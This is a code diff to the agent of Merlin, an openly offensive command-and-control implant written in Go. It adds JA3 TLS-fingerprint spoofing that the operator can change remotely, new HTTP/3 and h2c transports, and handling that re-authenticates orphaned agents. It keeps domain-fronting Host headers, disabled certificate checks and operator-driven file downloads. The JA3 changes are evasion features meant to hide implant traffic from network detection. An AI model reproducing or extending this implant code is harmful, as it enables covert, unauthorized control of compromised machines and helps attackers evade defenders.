@@ -42,11 +42,12 @@ import (
 	"strings"
 	"time"
 
+	"github.com/Ne0nd0g/ja3transport"
 	// 3rd Party
 	"github.com/cretz/gopaque/gopaque"
 	"github.com/fatih/color"
 	"github.com/lucas-clemente/quic-go"
-	"github.com/lucas-clemente/quic-go/h2quic"
+	"github.com/lucas-clemente/quic-go/http3"
 	"github.com/satori/go.uuid"
 	"golang.org/x/crypto/pbkdf2"
 	"golang.org/x/net/http2"
@@ -61,6 +62,13 @@ import (
 
 // GLOBAL VARIABLES
 var build = "nonRelease" // build is the build number of the Merlin Agent program set at compile time
+
+type merlinClient interface {
+	Do(req *http.Request) (*http.Response, error)
+	Get(url string) (resp *http.Response, err error)
+	Head(url string) (resp *http.Response, err error)
+	Post(url, contentType string, body io.Reader) (resp *http.Response, err error)
+}
 
 //TODO this is a duplicate with agents/agents.go, centralize
 
@@ -85,8 +93,8 @@ type Agent struct {
 	Skew          int64           // Skew is size of skew added to each WaitTime to vary check in attempts
 	Verbose       bool            // Verbose enables verbose messages to standard out
 	Debug         bool            // Debug enables debug messages to standard out
-	Proto         string          // Proto contains the transportation protocol the agent is using (i.e. h2 or hq)
-	Client        *http.Client    // Client is an http.Client object used to make HTTP connections for agent communications
+	Proto         string          // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
+	Client        *merlinClient   // Client is an interface for clients to make connections for agent communications
 	UserAgent     string          // UserAgent is the user agent string used with HTTP connections
 	initial       bool            // initial identifies if the agent has successfully completed the first initial check in
 	KillDate      int64           // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
@@ -98,10 +106,11 @@ type Agent struct {
 	Host          string          // HTTP Host header, typically used with Domain Fronting
 	pwdU          []byte          // SHA256 hash from 5000 iterations of PBKDF2 with a 30 character random string input
 	psk           string          // Pre-Shared Key
+	JA3           string          // JA3 signature (not the MD5 hash) use to generate a JA3 client
 }
 
 // New creates a new agent struct with specific values and returns the object
-func New(protocol string, url string, host string, psk string, proxy string, verbose bool, debug bool) (Agent, error) {
+func New(protocol string, url string, host string, psk string, proxy string, ja3 string, verbose bool, debug bool) (Agent, error) {
 	if debug {
 		message("debug", "Entering agent.New function")
 	}
@@ -123,7 +132,10 @@ func New(protocol string, url string, host string, psk string, proxy string, ver
 		KillDate:     0,
 		URL:          url,
 		Host:         host,
+		JA3:          ja3,
 	}
+
+	rand.Seed(time.Now().UnixNano())
 
 	u, errU := user.Current()
 	if errU != nil {
@@ -156,12 +168,13 @@ func New(protocol string, url string, host string, psk string, proxy string, ver
 		}
 	}
 
-	client, errClient := getClient(a.Proto, proxy)
+	var errClient error
+
+	a.Client, errClient = getClient(a.Proto, proxy, a.JA3)
+
 	if errClient != nil {
 		return a, fmt.Errorf("there was an error getting a transport client:\r\n%s", errClient)
 	}
-
-	a.Client = client
 
 	// Generate a random password and run it through 5000 iterations of PBKDF2; Used with OPAQUE
 	x := core.RandStringBytesMaskImprSrc(30)
@@ -190,6 +203,7 @@ func New(protocol string, url string, host string, psk string, proxy string, ver
 		message("info", fmt.Sprintf("\tIPs: %v", a.Ips))
 		message("info", fmt.Sprintf("\tProtocol: %s", a.Proto))
 		message("info", fmt.Sprintf("\tProxy: %v", proxy))
+		message("info", fmt.Sprintf("\tJA3 Signature: %s", a.JA3))
 	}
 	if debug {
 		message("debug", "Leaving agent.New function")
@@ -215,7 +229,7 @@ func (a *Agent) Run() error {
 				}
 				go a.statusCheckIn()
 			} else {
-				a.initial = a.initialCheckIn(a.Client)
+				a.initial = a.initialCheckIn()
 			}
 			if a.FailedCheckin >= a.MaxRetry {
 				return fmt.Errorf("maximum number of failed checkin attempts reached: %d", a.MaxRetry)
@@ -227,7 +241,7 @@ func (a *Agent) Run() error {
 		timeSkew := time.Duration(0)
 
 		if a.Skew > 0 {
-			timeSkew = time.Duration(rand.Int63n(a.Skew)) * time.Millisecond
+			timeSkew = time.Duration(rand.Int63n(a.Skew)) * time.Millisecond // #nosec G404 - Does not need to be cryptographically secure, deterministic is OK
 		}
 
 		totalWaitTime := a.WaitTime + timeSkew
@@ -239,7 +253,7 @@ func (a *Agent) Run() error {
 	}
 }
 
-func (a *Agent) initialCheckIn(client *http.Client) bool {
+func (a *Agent) initialCheckIn() bool {
 
 	if a.Debug {
 		message("debug", "Entering initialCheckIn function")
@@ -320,6 +334,10 @@ func (a *Agent) initialCheckIn(client *http.Client) bool {
 }
 
 func (a *Agent) statusCheckIn() {
+	if a.Debug {
+		message("debug", "Entering into agent.statusCheckIn()")
+	}
+
 	statusMessage := messages.Base{
 		Version: 1.0,
 		ID:      a.ID,
@@ -334,6 +352,47 @@ func (a *Agent) statusCheckIn() {
 		if a.Verbose {
 			message("warn", reqErr.Error())
 			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
+		}
+
+		// Handle HTTP3 Errors
+		if a.Proto == "http3" {
+			e := ""
+			n := false
+
+			// Application error 0x0 is typically the result of the server sending a CONNECTION_CLOSE frame
+			if strings.Contains(reqErr.Error(), "Application error 0x0") {
+				n = true
+				e = "Building new HTTP/3 client because received QUIC CONNECTION_CLOSE frame with NO_ERROR transport error code"
+			}
+
+			// Handshake timeout happens when a new client was not able to reach the server and setup a crypto handshake for the first time (no listener or no access)
+			if strings.Contains(reqErr.Error(), "NO_ERROR: Handshake did not complete in time") {
+				n = true
+				e = "Building new HTTP/3 client because QUIC HandshakeTimeout reached"
+			}
+
+			// No recent network activity happens when a PING timeout occurs.  KeepAlive setting can be used to prevent MaxIdleTimeout
+			// When the client has previously established a crypto handshake but does not hear back from it's PING frame the server within the client's MaxIdleTimeout
+			// Typically happens when the Merlin Server application is killed/quit without sending a CONNECTION_CLOSE frame from stopping the listener
+			if strings.Contains(reqErr.Error(), "NO_ERROR: No recent network activity") {
+				n = true
+				e = "Building new HTTP/3 client because QUIC MaxIdleTimeout reached"
+			}
+
+			if a.Debug {
+				message("debug", fmt.Sprintf("HTTP/3 error: %s", reqErr.Error()))
+			}
+
+			if n {
+				if a.Verbose {
+					message("note", e)
+				}
+				var errClient error
+				a.Client, errClient = getClient(a.Proto, "", "")
+				if errClient != nil {
+					message("warn", fmt.Sprintf("there was an error getting a new HTTP/3 client: %s", errClient.Error()))
+				}
+			}
 		}
 		return
 	}
@@ -371,8 +430,10 @@ func (a *Agent) statusCheckIn() {
 
 }
 
-// getClient returns a HTTP client for the passed in protocol (i.e. h2 or hq)
-func getClient(protocol string, proxyURL string) (*http.Client, error) {
+// getClient returns a HTTP client for the passed in protocol (i.e. h2 or http3)
+func getClient(protocol string, proxyURL string, ja3 string) (*merlinClient, error) {
+
+	var m merlinClient
 
 	/* #nosec G402 */
 	// G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
@@ -387,46 +448,100 @@ func getClient(protocol string, proxyURL string) (*http.Client, error) {
 		NextProtos: []string{protocol},
 	}
 
+	// Proxy
+	var proxy func(*http.Request) (*url.URL, error)
+	if proxyURL != "" {
+		rawURL, errProxy := url.Parse(proxyURL)
+		if errProxy != nil {
+			return nil, fmt.Errorf("there was an error parsing the proxy string:\r\n%s", errProxy.Error())
+		}
+		proxy = http.ProxyURL(rawURL)
+	}
+
+	// JA3
+	if ja3 != "" {
+		JA3, errJA3 := ja3transport.NewWithStringInsecure(ja3)
+		if errJA3 != nil {
+			return &m, fmt.Errorf("there was an error getting a new JA3 client:\r\n%s", errJA3.Error())
+		}
+		tr, err := ja3transport.NewTransportInsecure(ja3)
+		if err != nil {
+			return nil, err
+		}
+
+		// Set proxy
+		if proxyURL != "" {
+			tr.Proxy = proxy
+		}
+
+		JA3.Transport = tr
+
+		m = JA3
+		return &m, nil
+	}
+
+	var transport http.RoundTripper
 	switch strings.ToLower(protocol) {
-	case "hq":
-		transport := &h2quic.RoundTripper{
-			QuicConfig:      &quic.Config{IdleTimeout: 168 * time.Hour},
+	case "http3":
+		transport = &http3.RoundTripper{
+			QuicConfig: &quic.Config{
+				// Opted for a long timeout to prevent the client from sending a PING Frame
+				// If MaxIdleTimeout is too high, agent will never get an error if the server is off line and will perpetually run without exiting because MaxFailedCheckins is never incremented
+				//MaxIdleTimeout: time.Until(time.Now().AddDate(0, 42, 0)),
+				MaxIdleTimeout: time.Second * 30,
+				// KeepAlive will send a HTTP/2 PING frame to keep the connection alive
+				// If this isn't used, and the agent's sleep is greater than the MaxIdleTimeout, then the connection will timeout
+				KeepAlive: true,
+				// HandshakeTimeout is how long the client will wait to hear back while setting up the initial crypto handshake w/ server
+				HandshakeTimeout: time.Second * 30,
+			},
 			TLSClientConfig: TLSConfig,
 		}
-		return &http.Client{Transport: transport}, nil
 	case "h2":
-		transport := &http2.Transport{
+		transport = &http2.Transport{
 			TLSClientConfig: TLSConfig,
 		}
-		return &http.Client{Transport: transport}, nil
+	case "h2c":
+		transport = &http2.Transport{
+			AllowHTTP: true,
+			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
+				return net.Dial(network, addr)
+			},
+		}
 	case "https":
 		if proxyURL != "" {
-			rawURL, errProxy := url.Parse(proxyURL)
-			if errProxy != nil {
-				return nil, fmt.Errorf("there was an error parsing the proxy string:\r\n%s", errProxy.Error())
-			}
-			proxy := http.ProxyURL(rawURL)
-			transport := &http.Transport{
+			transport = &http.Transport{
 				TLSClientConfig: TLSConfig,
 				Proxy:           proxy,
 			}
-			return &http.Client{Transport: transport}, nil
+		} else {
+			transport = &http.Transport{
+				TLSClientConfig: TLSConfig,
+			}
 		}
-
-		transport := &http.Transport{
-			TLSClientConfig: TLSConfig,
+	case "http":
+		if proxyURL != "" {
+			transport = &http.Transport{
+				MaxIdleConns: 10,
+				Proxy:        proxy,
+			}
+		} else {
+			transport = &http.Transport{
+				MaxIdleConns: 10,
+			}
 		}
-		return &http.Client{Transport: transport}, nil
 	default:
 		return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
 	}
+	m = &http.Client{Transport: transport}
+	return &m, nil
 }
 
 // sendMessage is a generic function to receive a messages.Base struct, encode it, encrypt it, and send it to the server
 // The response message will be decrypted, decoded, and return a messages.Base struct.
 func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, error) {
 	if a.Debug {
-		message("debug", "Entering into agent.sendMessage")
+		message("debug", "Entering into agent.sendMessage()")
 	}
 	if a.Verbose {
 		message("note", fmt.Sprintf("Sending %s message to %s", m.Type, a.URL))
@@ -471,14 +586,34 @@ func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, erro
 		}
 
 		// Send the request
-		resp, err := a.Client.Do(req)
+		var client merlinClient // Why do I need to prove that a.Client is merlinClient type?
+		client = *a.Client
+		if a.Debug {
+			message("debug", fmt.Sprintf("Sending POST request size: %d to: %s", req.ContentLength, a.URL))
+		}
+		resp, err := client.Do(req)
+
 		if err != nil {
-			return returnMessage, fmt.Errorf("there was an error with the HTTP client while performing a POST:\r\n%s", err.Error())
+			return returnMessage, fmt.Errorf("there was an error with the %s client while performing a POST:\r\n%s", a.Proto, err.Error())
 		}
 		if a.Debug {
 			message("debug", fmt.Sprintf("HTTP Response:\r\n%+v", resp))
 		}
-		if resp.StatusCode != 200 {
+
+		switch resp.StatusCode {
+		case 200:
+			break
+		case 401:
+			if a.Verbose {
+				message("note", "server returned a 401, reauthenticating orphaned agent")
+			}
+			msg := messages.Base{
+				Version: 1.0,
+				ID:      a.ID,
+				Type:    "ReAuthenticate",
+			}
+			return msg, err
+		default:
 			return returnMessage, fmt.Errorf("there was an error communicating with the server:\r\n%d", resp.StatusCode)
 		}
 
@@ -500,7 +635,8 @@ func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, erro
 		}
 
 		// Check to make sure message response contained data
-		if resp.ContentLength == 0 {
+		// TODO Temporarily disabled length check for HTTP/3 connections https://github.com/lucas-clemente/quic-go/issues/2398
+		if resp.ContentLength == 0 && a.Proto != "http3" {
 			return returnMessage, fmt.Errorf("the response message did not contain any data")
 		}
 
@@ -546,7 +682,7 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 	}
 
 	if a.ID != m.ID {
-		return returnMessage, fmt.Errorf("the input message UUID did not match this agent's UUID")
+		return returnMessage, fmt.Errorf("the input message UUID did not match this agent's UUID %s:%s", a.ID, m.ID)
 	}
 	var c messages.CmdResults
 	if m.Token != "" {
@@ -578,7 +714,7 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 				if downloadFileErr != nil {
 					c.Stderr = downloadFileErr.Error()
 				} else {
-					errF := ioutil.WriteFile(p.FileLocation, downloadFile, 0644)
+					errF := ioutil.WriteFile(p.FileLocation, downloadFile, 0600)
 					if errF != nil {
 						c.Stderr = errF.Error()
 					} else {
@@ -773,6 +909,24 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 			if a.Verbose {
 				message("info", fmt.Sprintf("Set Kill Date to: %s",
 					time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
+			}
+		case "ja3":
+			a.JA3 = strings.Trim(p.Args, "\"'")
+
+			//Update the client
+			var err error
+
+			a.Client, err = getClient(a.Proto, "", a.JA3)
+
+			if err != nil {
+				c.Stderr = fmt.Sprintf("there was an error setting the agent client:\r\n%s", err.Error())
+				break
+			}
+
+			if a.Verbose && a.JA3 != "" {
+				message("note", fmt.Sprintf("Set agent JA3 signature to:%s", a.JA3))
+			} else if a.Verbose && a.JA3 == "" {
+				message("note", fmt.Sprintf("Setting agent client back to default using %s protocol", a.Proto))
 			}
 		default:
 			c.Stderr = fmt.Sprintf("%s is not a valid AgentControl message type.", p.Command)
@@ -1010,9 +1164,9 @@ func (a *Agent) opaqueRegister() error {
 	userRegInit := userReg.Init(a.pwdU)
 
 	if a.Debug {
-		message("debug", fmt.Sprintf("OPAQUE UserID: %v", userRegInit.UserID))
+		message("debug", fmt.Sprintf("OPAQUE UserID: %x", userRegInit.UserID))
 		message("debug", fmt.Sprintf("OPAQUE Alpha: %v", userRegInit.Alpha))
-		message("debug", fmt.Sprintf("OPAQUE PwdU: %s", a.pwdU))
+		message("debug", fmt.Sprintf("OPAQUE PwdU: %x", a.pwdU))
 	}
 
 	userRegInitBytes, errUserRegInitBytes := userRegInit.ToBytes()
@@ -1076,7 +1230,7 @@ func (a *Agent) opaqueRegister() error {
 	}
 
 	if a.Debug {
-		message("debug", fmt.Sprintf("OPAQUE EnvU: %v", userRegComplete.EnvU))
+		message("debug", fmt.Sprintf("OPAQUE EnvU: %x", userRegComplete.EnvU))
 		message("debug", fmt.Sprintf("OPAQUE PubU: %v", userRegComplete.UserPublicKey))
 	}
 
@@ -1118,7 +1272,7 @@ func (a *Agent) opaqueAuthenticate() error {
 	userAuth := gopaque.NewUserAuth(gopaque.CryptoDefault, a.ID.Bytes(), userKex)
 
 	// 2 - Call Init with the password and send the resulting UserAuthInit to the server
-	userAuthInit, err := userAuth.Init(a.secret)
+	userAuthInit, err := userAuth.Init(a.pwdU)
 	if err != nil {
 		return fmt.Errorf("there was an error creating the OPAQUE user authentication initialization message:\r\n%s", err.Error())
 	}
@@ -1154,6 +1308,15 @@ func (a *Agent) opaqueAuthenticate() error {
 		return fmt.Errorf("there was an error sending the agent OPAQUE authentication initialization message:\r\n%s", errAuthInitResp.Error())
 	}
 
+	// When the Merlin server has restarted but doesn't know the agent
+	if authInitResp.Type == "ReRegister" {
+		if a.Verbose {
+			message("note", "Received OPAQUE ReRegister response, setting initial to false")
+		}
+		a.initial = false
+		return nil
+	}
+
 	if authInitResp.Type != "AuthInit" {
 		return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user authentication initialization", authInitResp.Type)
 	}
@@ -1169,6 +1332,17 @@ func (a *Agent) opaqueAuthenticate() error {
 	// 4 - Call Complete with the server's ServerAuthComplete. The resulting UserAuthFinish has user and server key
 	// information. This would be the last step if we were not using an embedded key exchange. Since we are, take the
 	// resulting UserAuthComplete and send it to the server.
+	if a.Verbose {
+		message("note", "Received OPAQUE server complete message")
+	}
+
+	if a.Debug {
+		message("debug", fmt.Sprintf("OPAQUE Beta: %x", serverComplete.Beta))
+		message("debug", fmt.Sprintf("OPAQUE V: %x", serverComplete.V))
+		message("debug", fmt.Sprintf("OPAQUE PubS: %x", serverComplete.ServerPublicKey))
+		message("debug", fmt.Sprintf("OPAQUE EnvU: %x", serverComplete.EnvU))
+	}
+
 	_, userAuthComplete, errUserAuth := userAuth.Complete(&serverComplete)
 	if errUserAuth != nil {
 		return fmt.Errorf("there was an error completing OPAQUE authentication:\r\n%s", errUserAuth)
@@ -1319,6 +1493,7 @@ func (a *Agent) getAgentInfoMessage() messages.Base {
 		Proto:         a.Proto,
 		SysInfo:       sysInfoMessage,
 		KillDate:      a.KillDate,
+		JA3:           a.JA3,
 	}
 
 	baseMessage := messages.Base{
